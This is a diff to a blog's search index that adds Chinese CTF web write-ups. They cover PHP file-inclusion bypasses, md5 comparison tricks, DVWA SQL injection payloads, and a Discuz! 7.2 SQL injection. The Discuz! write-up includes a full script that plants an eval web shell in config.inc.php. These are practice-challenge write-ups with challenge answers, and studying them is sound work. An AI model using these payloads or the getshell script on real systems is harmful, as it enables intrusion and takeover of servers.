@@ -1,6 +1,56 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[ezphp-writeup]]></title>
+    <url>%2F2019%2F09%2F27%2Fezphp-writeup%2F</url>
+    <content type="text"><![CDATA[0x01 分析123456789101112131415161718192021222324252627&lt;?php //flag in flag.phpfunction is_save($file)&#123; if(preg_match(&apos;/^flag.php$/&apos;, $file))&#123; // /^flag.php$/ 意思是 前后只能是flag.php return false; &#125; return true;&#125;@extract($_GET);// $_GET[&apos;file&apos;]// $file = $_GET[&apos;file&apos;]// 将$_GET和$_POST超级变量数组获取的变量转为正常的变量，这样直接显示变量名称即可if(isset($file)&amp;&amp;!empty($file))&#123; //isset()判断变量是否定义 //empty()函数用于检查一个变量是否为空。 if(is_save($file))&#123; include($file); &#125;else&#123; echo &quot;Stupid Hacker!&quot;; &#125;&#125;else&#123; highlight_file(__FILE__);&#125;?&gt; 题目意思 是 通过外部参数 输入 flag.php 来包含出 flag.php 文件 ,但存在两个个问题。一是找不到输入点。只有一@extract($_GET);二是得绕过正则匹配。 @extract是将$_GET和$_POST超级变量数组获取的变量转为正常的变量，这样直接显示变量名称即可所以@extract等于 $file = $_GET[‘file’] 接下来就是绕过正则了 0x02 使用payload绕过 php://filter/read=convert.base64-encode/resource=flag.php 意思是将flag.php的源码打开以base64的形式输出 得到一窜base64加密的字符串 解码得到flag]]></content>
+      <categories>
+        <category>Writeup</category>
+      </categories>
+      <tags>
+        <tag>writeup</tag>
+        <tag>web-文件包含</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Discuz! Writeup]]></title>
+    <url>%2F2019%2F09%2F27%2FDiscuz!-Writeup%2F</url>
+    <content type="text"><![CDATA[0x01 分析 在主页找到discuz!版本，放入搜索引擎。找到这个版本的漏洞。根据一篇文章，得知。这道题获取flag的过程是通过注入漏洞，获取到uc-key。再通过然后通过php脚本以及获取到的uc-key将一句话写入config.inc.php,最后用菜刀连接，在根目录找到flag。 0x02 过程 在主页发现此论坛版本 Discuz! 7.2 根据得到的论坛版本号 进行google、百度搜索，得到此版本存在一个注入漏洞 payload 这个payload 只能取到uc-key 的62位 1faq.php?action=grouppermission&amp;gids[99]=&apos;&amp;gids[100][0]=) and (select 1 from (select count(*),concat(floor(rand(0)*2),0x3a,(select substr(authkey,1,62) from cdb_uc_applications limit 0,1),0x3a)x from information_schema.tables group by x)a)%23 取uc-key 最后几位 1faq.php?action=grouppermission&amp;gids[99]=&apos;&amp;gids[100][0]=) and (select 1 from (select count(*),concat(floor(rand(0)*2),0x3a,(select substr(authkey,63,60) from cdb_uc_applications limit 0,1),0x3a)x from information_schema.tables group by x)a)%23 得到完整的uc-key：h3Sdtbyey2GcW780weU5j0adY2s0N2R6ecp8I4F206E7Wfoewdy8N3pa04w7Qema 接下来 把得到uc-key 放入 getshell 的脚本，需要注意的是，题目的url是不能跟端口的，并且默认的端口是80。 12345//5$host=&quot;ctf.aweik.cn&quot;;//7$uc_key=&quot;h3Sdtbyey2GcW780weU5j0adY2s0N2R6ecp8I4F206E7Wfoewdy8N3pa04w7Qema&quot;; 在65行 $fp = fsockopen($host, 8099); 完整的脚本 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161&lt;?php$timestamp = time()+10*3600;$host=&quot;ctf.aweik.cn&quot;;$uc_key=&quot;h3Sdtbyey2GcW780weU5j0adY2s0N2R6ecp8I4F206E7Wfoewdy8N3pa04w7Qema&quot;;$code=urlencode(_authcode(&quot;time=$timestamp&amp;action=updateapps&quot;, &apos;ENCODE&apos;, $uc_key));$cmd1=&apos;&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;root&gt;&lt;item id=&quot;UC_API&quot;&gt;xxx\&apos;);eval($_POST[cmd]);//&lt;/item&gt;&lt;/root&gt;&apos;;$cmd2=&apos;&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;&lt;root&gt;&lt;item id=&quot;UC_API&quot;&gt;aaa&lt;/item&gt;&lt;/root&gt;&apos;;$html1 = send($cmd1);echo $html1;$html2 = send($cmd2);echo $html2;function send($cmd)&#123;global $host,$code;$message = &quot;POST /api/uc.php?code=&quot;.$code.&quot; HTTP/1.1\r\n&quot;;$message .= &quot;Accept: */*\r\n&quot;;$message .= &quot;Referer: &quot;.$host.&quot;\r\n&quot;;$message .= &quot;Accept-Language: zh-cn\r\n&quot;;$message .= &quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;$message .= &quot;User-Agent: Mozilla/4.0 (compatible; MSIE 6.00; Windows NT 5.1; SV1)\r\n&quot;;$message .= &quot;Host: &quot;.$host.&quot;\r\n&quot;;$message .= &quot;Content-Length: &quot;.strlen($cmd).&quot;\r\n&quot;;$message .= &quot;Connection: Close\r\n\r\n&quot;;$message .= $cmd;$fp = fsockopen($host, 8099);fputs($fp, $message);$resp = &apos;&apos;;while ($fp &amp;&amp; !feof($fp))$resp .= fread($fp, 1024);return $resp;&#125;function _authcode($string, $operation = &apos;DECODE&apos;, $key = &apos;&apos;, $expiry = 0) &#123;$ckey_length = 4;$key = md5($key ? $key : UC_KEY);$keya = md5(substr($key, 0, 16));$keyb = md5(substr($key, 16, 16));$keyc = $ckey_length ? ($operation == &apos;DECODE&apos; ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : &apos;&apos;;$cryptkey = $keya.md5($keya.$keyc);$key_length = strlen($cryptkey);$string = $operation == &apos;DECODE&apos; ? base64_decode(substr($string, $ckey_length)) : sprintf(&apos;%010d&apos;, $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string;$string_length = strlen($string);$result = &apos;&apos;;$box = range(0, 255);$rndkey = array();for($i = 0; $i &lt;= 255; $i++) &#123;$rndkey[$i] = ord($cryptkey[$i % $key_length]);&#125;for($j = $i = 0; $i &lt; 256; $i++) &#123;$j = ($j + $box[$i] + $rndkey[$i]) % 256;$tmp = $box[$i];$box[$i] = $box[$j];$box[$j] = $tmp;&#125;for($a = $j = $i = 0; $i &lt; $string_length; $i++) &#123;$a = ($a + 1) % 256;$j = ($j + $box[$a]) % 256;$tmp = $box[$a];$box[$a] = $box[$j];$box[$j] = $tmp;$result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));&#125;if($operation == &apos;DECODE&apos;) &#123;if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() &gt; 0) &amp;&amp; substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) &#123;return substr($result, 26);&#125; else &#123;return &apos;&apos;;&#125;&#125; else &#123;return $keyc.str_replace(&apos;=&apos;, &apos;&apos;, base64_encode($result));&#125;&#125;?&gt; 在php环境下 执行 写入成功 GetShell 菜刀连接 http://ctf.aweik.cn:8099/config.inc.php # 密码 cmd 在根目录发现flag 下载 打开 得到]]></content>
+      <categories>
+        <category>Writeup</category>
+      </categories>
+      <tags>
+        <tag>writeup</tag>
+        <tag>web-bbs</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[BugKu-Web题[备份是个好习惯]]]></title>
+    <url>%2F2019%2F09%2F27%2FBugKu-Web%E9%A2%98-%E5%A4%87%E4%BB%BD%E6%98%AF%E4%B8%AA%E5%A5%BD%E4%B9%A0%E6%83%AF%2F</url>
+    <content type="text"><![CDATA[0x01 分析 打开网页，发现是一堆md5加密后的字符。但是题目中提到了备份两个字眼，所以直接就在网页后面加上index.php.swp 发现没有这个文件，后面又加上 index.php.bak 。存在这个文件，直接下载在来打开得到下面代码。 1234567891011121314151617181920212223&lt;?phpinclude_once &quot;flag.php&quot;;ini_set(&quot;display_errors&quot;, 0);$str = strstr($_SERVER[&apos;REQUEST_URI&apos;], &apos;?&apos;);//获取 访问页面的url 然后 截取?及后面的字符 赋值给 $str$str = substr($str,1);//截取 $str 第第一位及后边字符$str = str_replace(&apos;key&apos;,&apos;&apos;,$str);//把 $str 中的存在 &apos;key&apos; 字符 替换为 &apos;&apos;parse_str($str);//#parse_str()把查询的字符串解析到变量中echo md5($key1);echo md5($key2);if(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123; echo $flag.&quot;取得flag&quot;;&#125;?&gt; 最终获取flag需要的条件是 md5($key1)==md5($key2) &amp;&amp; $key1 !== $key2 立马就想到了传入数组。数组被md5函数加密后会返回false。 分析代码：首先会获取访问页面的url，然后截取?及后面字符串 赋值给 变量 $str, 其次会截取 $str 第一位及后面的字符串，str_replace()函数会把截取到的字符串中存在 ‘key’ 的字符串 替换成 ‘’ 。最后parse_str()函数会把$str 中的字符串 解析到变量中。 0x02 构造payload获取flag 第一种方法 利用数组绕过?kkeyey1[]=0&amp;kkeyey2[]=1 Bugku{OH_YOU_FIND_MY_MOMY} 第二种方法 利用 = = 比较漏洞如果字符经md5加密后的值为 0exxxx形式，就会被认为是科学计算法，且表示的是0*10的xxxx次方，还是零，也是相等的?kkeyey1=QNKCDZO&amp;kkeyey2=240610708 1234567这些字符串md5加密后都是0e开头QNKCDZO240610708s878926199as155964671as214587387as214587387a]]></content>
+      <categories>
+        <category>Writeup</category>
+      </categories>
+      <tags>
+        <tag>BugKu</tag>
+        <tag>web-代码审计</tag>
+        <tag>writeup</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[BugKu-Web题[flag在index里]]]></title>
+    <url>%2F2019%2F09%2F27%2FBugKu-Web%E9%A2%98%5Bflag%E5%9C%A8index%E9%87%8C%5D%2F</url>
+    <content type="text"><![CDATA[0x01分析这道考的是文件包含漏洞 ,但是过滤了 ../，根据这道题名提示 ，需要绕过 ../ 把index 文件包含出来 。 0x02 绕过过滤的Payloadphp://filter/read=convert.base64-encode/resource=index.php 意思是将index.php的源码打开以base64的形式输出 0x03 base64解码得到flag flag{edulcni_elif_lacol_si_siht}]]></content>
+      <categories>
+        <category>Writeup</category>
+      </categories>
+      <tags>
+        <tag>BugKu</tag>
+        <tag>writeup</tag>
+        <tag>web-文件包含</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[4-PHP-函数语法]]></title>
     <url>%2F2019%2F09%2F10%2F4-PHP-%E5%87%BD%E6%95%B0%E8%AF%AD%E6%B3%95%2F</url>
     <content type="text"><![CDATA[0x01函数的定义123456function 函数名(参数1，参数2，...，参数n)&#123; 函数体； return 表达式； &#125; 0x02函数调用 函数名（）;//调用函数 函数默认参数12345678function test（$a=10）&#123; echo $a; &#125;st（20）;//结果为 20test（10）;//结果为10 > 可变函数（变量函数）1234567function test（）&#123; echo &quot;我是test函数&quot;;&#125;$a = &quot;test&quot;;//把函数加上引号，赋给变量即可$a();//test（）;]]></content>
@@ -57,9 +107,10 @@
     <url>%2F2019%2F09%2F08%2FDVWA-SQL-Injection-Payload%2F</url>
     <content type="text"><![CDATA[0x01 Low （get注入） 查数据库 1-1 &apos;union select 1,group_concat(schema_name) from information_schema.schemata where schema_name=database() # 查表名 1-1 &apos;union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() # 查字段名 1-1 &apos;union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() # 查值 1-1 &apos;union select 1,group_concat(user,password) from users # 0x02 Medium（post注入（抓包））： 查数据库 1-1 &apos;union select 1,group_concat(schema_name) from information_schema.schemata where schema_name=database() # 查表名 1-1 &apos;union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() # 查字段名 1-1 &apos;union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() # 查值 1-1 &apos;union select 1,group_concat(user,password) from users # 0x03 High（get注入（与Low级别区别只在于多了一个LIMIT 1）） 查数据 1-1 union select 1,group_concat(schema_name) from information_schema.schemata where schema_name=database() # 查表名 1-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() # 查字段名 1-1 union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() # 查值 1-1 union select 1,group_concat(user,password) from users #]]></content>
       <categories>
-        <category>学习笔记</category>
+        <category>Writeup</category>
       </categories>
       <tags>
+        <tag>writeup</tag>
         <tag>DVWA</tag>
         <tag>SQL注入</tag>
         <tag>Payload</tag>
